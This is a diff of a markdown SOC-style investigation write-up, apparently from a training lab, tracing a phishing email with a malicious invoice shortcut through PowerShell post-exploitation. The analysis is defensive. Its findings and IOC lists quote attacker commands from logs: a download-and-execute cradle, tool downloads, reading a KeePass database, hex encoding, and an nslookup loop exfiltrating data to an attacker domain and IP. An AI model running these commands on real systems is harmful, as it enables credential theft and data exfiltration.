@@ -8,6 +8,8 @@ The investigation begins with a suspicious invoice/payment-themed email sent to 
 
 Further analysis showed that the shortcut file was configured to launch PowerShell with hidden and encoded command-line arguments. The decoded PowerShell command attempted to download and execute remote content from an external URL.
 
+Endpoint PowerShell logs later showed post-exploitation activity on the compromised workstation. The attacker performed enumeration, accessed Microsoft Sticky Notes data, located a KeePass database file, encoded the file content as hexadecimal data, and attempted DNS-based exfiltration using `nslookup`.
+
 Based on the current evidence, the phishing email and shortcut file appear to be the initial delivery and execution mechanism for the compromise.
 
 ---
@@ -28,16 +30,25 @@ The objectives of this investigation are to:
 - Build an attack timeline.
 - Document findings in a SOC-style format.
 
+---
+
 ## 3. Evidence Sources Reviewed
 
-Evidence reviewed during Task 2:
+Evidence reviewed during this investigation:
 
 - `dump.eml`
 - `payload.txt`
 - `Invoice.zip`
 - `Invoice_20230103.lnk`
 - `lnkparse` output
-- Task 2 screenshots in `screenshots/`
+- `powershell.json`
+- PowerShell Event ID 4104 records
+- Terminal command output
+- Investigation screenshots in `screenshots/`
+
+---
+
+# Task 2 — Email and Attachment Analysis
 
 ## 4. Initial Access Analysis
 
@@ -49,7 +60,9 @@ The email subject was:
 
 ```text
 Collection for Quick Logistics LLC - Jan 2023
-```
+````
+
+The email body referenced a document due for payment and instructed the recipient to open an encrypted attachment using a password included in the message body.
 
 ### 4.2 Sender Information
 
@@ -77,6 +90,14 @@ screenshots/01-email-sender-recipient.png
 ### Analyst Notes
 
 The sender address appeared consistently across multiple headers, supporting that `agriffin@bpakcaging.xyz` was the sender address used in the phishing email.
+
+The domain `bpakcaging.xyz` is suspicious in this context because it was used in the phishing sender address and later appeared in attacker-related infrastructure. The `.xyz` top-level domain alone does not prove malicious activity, but the combination of phishing delivery, suspicious attachment behavior, remote payload hosting, and endpoint activity makes the domain relevant to the investigation.
+
+### Why This Matters
+
+This finding helps establish the initial access stage of the attack. The phishing email was the delivery mechanism used to place the malicious attachment in front of the victim.
+
+***
 
 ## 5. Victim Identification
 
@@ -106,10 +127,10 @@ Identifying the victim helps define the scope of the investigation. Since the ph
 
 The email headers indicated that third-party mail relay infrastructure was used.
 
-The `DKIM-Signature` header showed:
+The `DKIM-Signature` header referenced:
 
 ```text
-DKIM-Signature: v=1; a=rsa-sha256; d=elasticemail.com; s=api;
+elasticemail.com
 ```
 
 The `List-Unsubscribe` header referenced:
@@ -118,11 +139,21 @@ The `List-Unsubscribe` header referenced:
 bounces.elasticemail.net
 ```
 
+The email headers also showed sender infrastructure including:
+
+```text
+15.235.99.80
+pa80.mxout.mta1.net
+tracking.bpakcaging.xyz
+```
+
 ### Analyst Notes
 
 The third-party mail relay service identified was Elastic Email.
 
 This does not mean Elastic Email itself was malicious. The evidence suggests that the attacker may have used or abused legitimate email delivery infrastructure to send the phishing email.
+
+The sender IP address `15.235.99.80` and tracking-related domain `tracking.bpakcaging.xyz` are useful email investigation artifacts. These should be treated as contextual indicators and validated with additional mail-flow or threat intelligence data before being treated as definitively malicious.
 
 ### Why This Matters
 
@@ -152,7 +183,9 @@ Invoice.zip
 
 Screenshot reference:
 
-![Attachment metadata showing Invoice.zip](screenshots/02-email-attachment-metadata.png)
+```text
+screenshots/02-email-attachment-metadata.png
+```
 
 ### 7.2 Attachment Reconstruction
 
@@ -184,7 +217,9 @@ You may use this code to view the encrypted file: Invoice2023!
 
 Screenshot reference:
 
-![ZIP password shown in the email body](screenshots/03-zip-password-email-body.png)
+```text
+screenshots/03-zip-password-email-body.png
+```
 
 ### 7.4 ZIP Extraction
 
@@ -202,7 +237,9 @@ Invoice_20230103.lnk
 
 Screenshot reference:
 
-![ZIP extraction showing the LNK file](screenshots/04-zip-reconstruction-extraction.png)
+```text
+screenshots/04-zip-reconstruction-extraction.png
+```
 
 ### Analyst Notes
 
@@ -242,6 +279,12 @@ The shortcut also referenced an Excel icon path:
 C:\Users\Administrator\Desktop\excel.ico
 ```
 
+Screenshot reference:
+
+```text
+screenshots/05-lnkparse-powershell-command.png
+```
+
 ### Analyst Notes
 
 The shortcut file was configured to launch PowerShell instead of opening an invoice document.
@@ -258,10 +301,6 @@ The PowerShell arguments were suspicious:
 
 This finding confirms that the extracted `.lnk` file was malicious. The shortcut was designed to execute hidden and encoded PowerShell, which is commonly associated with attacker activity.
 
-Screenshot reference:
-
-![lnkparse output showing the PowerShell command](screenshots/05-lnkparse-powershell-command.png)
-
 ***
 
 ## 9. PowerShell Payload Analysis
@@ -276,6 +315,12 @@ After decoding, the payload was:
 
 ```powershell
 iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
+```
+
+Screenshot reference:
+
+```text
+screenshots/06-decoded-powershell-payload.png
 ```
 
 ### Analyst Notes
@@ -304,17 +349,13 @@ to execute the downloaded content directly in PowerShell.
 
 `iex` is short for `Invoke-Expression`. It executes a string as PowerShell code.
 
-Screenshot reference:
-
-![Decoded PowerShell payload](screenshots/06-decoded-powershell-payload.png)
-
 ### Why This Matters
 
 This behavior indicates that the shortcut file was likely a first-stage payload. Its purpose was not to display an invoice, but to download and execute remote attacker-controlled code.
 
 ***
 
-## 10. Confirmed Findings
+## 10. Task 2 Confirmed Findings
 
 ### Finding 1: Phishing Email Delivered to Finance Employee
 
@@ -403,61 +444,17 @@ http://files.bpakcaging.xyz/update
 
 The following questions were identified after Task 2 and investigated during Task 3:
 
-- Did PowerShell activity continue on the endpoint?
-- Were additional attacker domains observed?
-- Was the remote payload activity followed by tool download or execution?
-- Were additional IOCs identified from endpoint logs?
+* Did PowerShell activity continue on the endpoint?
+* Were additional attacker domains observed?
+* Was the remote payload activity followed by tool download or execution?
+* Were additional IOCs identified from endpoint logs?
+* Was sensitive data accessed or staged for exfiltration?
 
 ***
-
-## 13. Candidate Timeline Events
-
-These events should be added to `timeline.md` later:
-
-```text
-1. Phishing email sent to Julianne Westcott.
-2. Email received with invoice/payment lure.
-3. Email attachment identified as Invoice.zip.
-4. ZIP password identified in email body.
-5. Base64 attachment reconstructed into Invoice.zip.
-6. ZIP archive extracted.
-7. Invoice_20230103.lnk identified inside the ZIP archive.
-8. LNK file analyzed with lnkparse.
-9. LNK file found to execute PowerShell.
-10. PowerShell command found using -nop, hidden window, and encoded payload.
-11. Encoded payload decoded.
-12. Payload identified as download cradle for http://files.bpakcaging.xyz/update.
-```
-
-***
-
-## 14. Personal Learning Notes
-
-### Things I understood better from this stage
-
-* How to inspect an `.eml` file manually.
-* How to identify sender and recipient information from email headers.
-* How to inspect folded email headers.
-* How Base64 email attachments can be reconstructed.
-* Why password-protected ZIP attachments are suspicious.
-* Why `.lnk` files are dangerous in phishing attacks.
-* How `lnkparse` helps inspect shortcut file behavior.
-* Why hidden and encoded PowerShell is suspicious.
-* How a PowerShell download cradle works.
-
-### Things I need to review more
-
-* How DKIM headers work.
-* How to analyze email authentication results.
-* How to safely decode PowerShell payloads.
-* How to identify whether a remote payload successfully executed.
-* How to correlate email evidence with endpoint logs.
-
----
 
 # Task 3 — Endpoint Security Analysis
 
-## 15. Task 3 Summary
+## 13. Task 3 Summary
 
 Task 3 focused on endpoint activity after the malicious `.lnk` file executed PowerShell.
 
@@ -477,11 +474,12 @@ The attacker used PowerShell to interact with suspicious infrastructure, downloa
 
 ***
 
-## 16. Evidence Sources Reviewed
+## 14. Evidence Sources Reviewed for Task 3
 
 Evidence reviewed during Task 3:
 
 * `powershell.json`
+* PowerShell Event ID 4104 records
 * PowerShell log entries
 * `jq` query output
 * `grep` query output
@@ -490,7 +488,7 @@ Evidence reviewed during Task 3:
 
 ***
 
-## 17. Finding 1: Attacker Domains Observed in PowerShell Logs
+## 15. Finding 1: Attacker Domains Observed in PowerShell Logs
 
 ### Evidence
 
@@ -507,7 +505,7 @@ cdn.bpakcaging.xyz
 files.bpakcaging.xyz
 ```
 
-### Screenshot References
+Screenshot references:
 
 ```text
 screenshots/task3-q1-attacker-domains.png
@@ -532,7 +530,7 @@ This connects the phishing attachment from Task 2 to later endpoint activity. Th
 
 ***
 
-## 18. Finding 2: Seatbelt Enumeration Tool Downloaded and Executed
+## 16. Finding 2: Seatbelt Enumeration Tool Downloaded and Executed
 
 ### Evidence
 
@@ -545,18 +543,22 @@ cat powershell.json | jq -s 'sort_by(.Timestamp) | .[] | select(tostring | test(
 The logs showed:
 
 ```text
-2023-01-13 17:12:17.683688Z
+2023-01-13 17:12:17.683688 UTC
+PowerShell Event ID 4104
+Record ID 553
 iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd
 ```
 
 Later activity showed:
 
 ```text
-2023-01-13 17:18:05.437844Z
+2023-01-13 17:18:05.437844 UTC
+PowerShell Event ID 4104
+Record ID 630
 Seatbelt.exe -group=user;pwd
 ```
 
-### Screenshot Reference
+Screenshot reference:
 
 ```text
 screenshots/task3-q2-seatbelt-download-and-execution.png
@@ -578,7 +580,7 @@ This indicates post-compromise discovery activity. After achieving PowerShell ex
 
 ***
 
-## 19. Finding 3: Sticky Notes Database Accessed Using sq3.exe
+## 17. Finding 3: Sticky Notes Database Accessed Using sq3.exe
 
 ### Evidence
 
@@ -591,28 +593,40 @@ cat powershell.json | jq -s 'sort_by(.Timestamp) | .[] | select(tostring | test(
 The logs showed the attacker browsing the Sticky Notes directory:
 
 ```text
-ls AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe;pwd
+2023-01-13 17:22:47.494476 UTC
+PowerShell Event ID 4104
+Record ID 686
+ls AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe;pwd
 ```
 
-Then:
+The attacker then browsed the Sticky Notes `LocalState` folder:
 
 ```text
-ls AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState;pwd
+2023-01-13 17:22:53.558146 UTC
+PowerShell Event ID 4104
+Record ID 692
+ls AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState;pwd
 ```
 
 The attacker downloaded `sq3.exe`:
 
-```powershell
+```text
+2023-01-13 17:23:38.796891 UTC
+PowerShell Event ID 4104
+Record ID 703
 iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;pwd
 ```
 
 The attacker then used `sq3.exe` to query the Sticky Notes database:
 
-```powershell
-.\\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite "SELECT * from NOTE limit 100";pwd
+```text
+2023-01-13 17:25:38.759011 UTC
+PowerShell Event ID 4104
+Record ID 724
+.\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100";pwd
 ```
 
-### Screenshot Reference
+Screenshot reference:
 
 ```text
 screenshots/task3-q3-sq3-sticky-notes-plum-sqlite.png
@@ -644,7 +658,7 @@ This suggests the attacker was searching user application data for sensitive inf
 
 ***
 
-## 20. Finding 4: KeePass Database File Targeted for Exfiltration
+## 18. Finding 4: KeePass Database File Targeted for Exfiltration
 
 ### Evidence
 
@@ -656,17 +670,32 @@ cat powershell.json | jq -s 'sort_by(.Timestamp) | .[] | select(tostring | test(
 
 The logs showed the attacker checking for:
 
-```powershell
-ls C:\\Users\\j.westcott\\Documents\\protected_data.kdbx;pwd
+```text
+2023-01-13 17:19:06.035992 UTC
+PowerShell Event ID 4104
+Record ID 646
+ls C:\Users\j.westcott\Documents\protected_data.kdbx;pwd
 ```
 
-The attacker later prepared to read the file:
+The attacker later prepared the file for exfiltration:
 
-```powershell
-$file='C:\\Users\\j.westcott\\Documents\\protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd
+```text
+2023-01-13 17:31:48.507719 UTC
+PowerShell Event ID 4104
+Record ID 741
+$file='protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd
 ```
 
-### Screenshot Reference
+The attacker then read the file using the full path:
+
+```text
+2023-01-13 17:32:15.105474 UTC
+PowerShell Event ID 4104
+Record ID 762
+$file='C:\Users\j.westcott\Documents\protected_data.kdbx'; $destination = "167.71.211.113"; $bytes = [System.IO.File]::ReadAllBytes($file);;pwd
+```
+
+Screenshot reference:
 
 ```text
 screenshots/task3-q5-protected-data-kdbx-exfil-file.png
@@ -694,7 +723,7 @@ This is a high-impact finding. A KeePass database may contain stored credentials
 
 ***
 
-## 21. Finding 5: Hex Encoding Used During Exfiltration Attempt
+## 19. Finding 5: Hex Encoding Used During Exfiltration Attempt
 
 ### Evidence
 
@@ -706,19 +735,20 @@ cat powershell.json | jq -s 'sort_by(.Timestamp) | .[] | select(tostring | test(
 
 The logs showed the file being read as bytes:
 
-```powershell
-$bytes = [System.IO.File]::ReadAllBytes($file)
+```text
+[System.IO.File]::ReadAllBytes($file)
 ```
 
-The logs also showed the byte content being converted into hexadecimal format, for example:
+The logs also showed the byte content being converted into hexadecimal format:
 
-```powershell
-[System.BitConverter]::ToString($bytes) -replace '-', ''
+```text
+2023-01-13 17:32:23.702462 UTC
+PowerShell Event ID 4104
+Record ID 768
+$hex = ($bytes | ForEach-Object { $_.ToString('x2') }) -join ''
 ```
 
-The activity also referenced exfiltration behavior using `nslookup`.
-
-### Screenshot References
+Screenshot references:
 
 ```text
 screenshots/task3-q7-hex-encoding-focused.png
@@ -728,33 +758,30 @@ screenshots/task3-exfil-nslookup-hex-dns.png
 
 ### Analyst Notes
 
-The attacker attempted to encode the contents of the targeted file as hex before exfiltration.
+The attacker attempted to encode the contents of the targeted KeePass database as hex before exfiltration.
 
-The use of `nslookup` suggests DNS-based exfiltration behavior. The destination IP observed was:
-
-```text
-167.71.211.113
-```
+The use of hex encoding allowed binary file content to be represented in a text-based format suitable for transmission through DNS queries.
 
 ### Why This Matters
 
-DNS-based exfiltration can bypass some traditional monitoring if DNS traffic is not inspected closely. Encoding file contents as hex allows binary data to be represented in a format that can be transmitted through text-based mechanisms such as DNS queries.
+Encoding file contents as hex allows binary data to be transmitted through text-based mechanisms such as DNS queries. This is relevant because the later use of `nslookup` suggests DNS-based exfiltration behavior.
 
 ***
 
-## 22. Finding 6: DNS-Based Exfiltration Attempt Using nslookup
+## 20. Finding 6: DNS-Based Exfiltration Attempt Using nslookup
 
 ### Evidence
 
-The logs and screenshots indicate that `nslookup` was used as part of the exfiltration attempt toward the attacker-controlled destination. The PowerShell activity contained nslookup commands similar to the following pattern:
+The PowerShell logs showed `nslookup` being used as part of the exfiltration attempt toward the attacker-controlled destination:
 
-```powershell
-nslookup -type=txt 504B0304...bpakcaging.xyz 167.71.211.113
+```text
+2023-01-13 17:32:41.384043 UTC
+PowerShell Event ID 4104
+Record ID 774
+for($i=0;$i -lt $hex.length; $i+=48){ $chunk = $hex.substring($i, :Min(48,$hex.length-$i)); nslookup "$chunk.exfil.bpakcaging.xyz" 167.71.211.113; } ;pwd
 ```
 
-Note: Hex value truncated for readability (example shows leading bytes `504B0304...`). If available, replace with the actual truncated fragment observed in logs or screenshots (`screenshots/task3-exfil-nslookup-hex-dns.png`).
-
-### Screenshot Reference
+Screenshot reference:
 
 ```text
 screenshots/task3-exfil-nslookup-hex-dns.png
@@ -762,7 +789,17 @@ screenshots/task3-exfil-nslookup-hex-dns.png
 
 ### Analyst Notes
 
-The attacker used `nslookup` to transmit encoded file content through DNS queries toward `167.71.211.113`.
+The attacker used `nslookup` to transmit encoded file content through DNS queries toward:
+
+```text
+167.71.211.113
+```
+
+The DNS query pattern used:
+
+```text
+$chunk.exfil.bpakcaging.xyz
+```
 
 ### Why This Matters
 
@@ -770,7 +807,7 @@ This behavior is consistent with DNS-based exfiltration, where encoded data is p
 
 ***
 
-## 23. Task 3 Confirmed Findings
+## 21. Task 3 Confirmed Findings
 
 ### Finding 1: Additional Attacker Infrastructure Identified
 
@@ -829,7 +866,7 @@ C:\Users\j.westcott\Documents\protected_data.kdbx
 
 ### Finding 7: DNS-Based Exfiltration Attempt Observed
 
-The attacker attempted exfiltration using:
+The attacker attempted DNS-based exfiltration using:
 
 ```text
 nslookup
@@ -843,13 +880,14 @@ The destination IP was:
 
 ***
 
-## 24. New IOCs and Artifacts from Task 3
+## 22. New IOCs and Artifacts from Task 3
 
 ### Domains
 
 ```text
 cdn.bpakcaging.xyz
 files.bpakcaging.xyz
+exfil.bpakcaging.xyz
 ```
 
 ### URLs
@@ -893,12 +931,13 @@ Seatbelt.exe -group=user
 iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe
 nslookup
 [System.IO.File]::ReadAllBytes($file)
-[System.BitConverter]::ToString($bytes) -replace '-', ''
+$hex = ($bytes | ForEach-Object { $_.ToString('x2') }) -join ''
+for($i=0;$i -lt $hex.length; $i+=48){ $chunk = $hex.substring($i, :Min(48,$hex.length-$i)); nslookup "$chunk.exfil.bpakcaging.xyz" 167.71.211.113; } ;pwd
 ```
 
 ***
 
-## 25. Task 3 Timeline Events
+## 23. Task 3 Timeline Events
 
 Candidate events to add to `timeline.md`:
 
@@ -907,26 +946,60 @@ Candidate events to add to `timeline.md`:
 2. Attacker infrastructure identified in PowerShell logs: cdn.bpakcaging.xyz and files.bpakcaging.xyz.
 3. Attacker loaded or downloaded Invoke-Seatbelt.ps1.
 4. Attacker executed Seatbelt.exe with -group=user.
-5. Attacker browsed Microsoft Sticky Notes application data.
-6. Attacker downloaded sq3.exe from files.bpakcaging.xyz.
-7. Attacker used sq3.exe to query plum.sqlite.
-8. Attacker located protected_data.kdbx in the victim user's Documents directory.
-9. Attacker read protected_data.kdbx as bytes.
-10. Attacker converted file content into hex format.
-11. Attacker attempted DNS-based exfiltration using nslookup.
-12. Exfiltration destination observed: 167.71.211.113.
+5. Attacker located protected_data.kdbx in the victim user's Documents directory.
+6. Attacker browsed Microsoft Sticky Notes application data.
+7. Attacker downloaded sq3.exe from files.bpakcaging.xyz.
+8. Attacker used sq3.exe to query plum.sqlite.
+9. Attacker prepared protected_data.kdbx for exfiltration.
+10. Attacker read protected_data.kdbx as bytes.
+11. Attacker converted file content into hex format.
+12. Attacker attempted DNS-based exfiltration using nslookup.
+13. Exfiltration destination observed: 167.71.211.113.
 ```
 
----
+***
 
-## 26. Open Questions After Task 3
+## 24. Open Questions After Task 3
 
 Questions to answer in the next investigation stage:
 
-* Was the exfiltration attempt successful?
+* Was the DNS exfiltration attempt successful?
 * Were DNS logs available to confirm full data transfer?
 * Did the attacker create or execute additional files after `sq3.exe`?
 * Were any credentials recovered or exposed from Sticky Notes or KeePass?
 * Was the KeePass master password compromised?
 * Were any persistence mechanisms created?
 * Were additional hosts contacted or affected?
+
+***
+
+## 25. Personal Learning Notes
+
+### Things I understood better from this investigation
+
+* How to inspect an `.eml` file manually.
+* How to identify sender and recipient information from email headers.
+* How to inspect folded email headers.
+* How Base64 email attachments can be reconstructed.
+* Why password-protected ZIP attachments are suspicious.
+* Why `.lnk` files are dangerous in phishing attacks.
+* How `lnkparse` helps inspect shortcut file behavior.
+* Why hidden and encoded PowerShell is suspicious.
+* How a PowerShell download cradle works.
+* How PowerShell Event ID 4104 can reveal attacker commands.
+* How post-exploitation enumeration appears in PowerShell logs.
+* Why Sticky Notes data can be valuable to attackers.
+* Why KeePass database files are high-value targets.
+* How hex encoding can support data exfiltration.
+* How `nslookup` can be abused for DNS-based exfiltration.
+
+### Things I need to review more
+
+* How DKIM headers work.
+* How to analyze email authentication results.
+* How to safely decode PowerShell payloads.
+* How to correlate email evidence with endpoint logs.
+* How to confirm whether DNS exfiltration completed successfully.
+* How to map findings to MITRE ATT\&CK techniques.
+* How to convert investigation notes into a professional incident report.
+
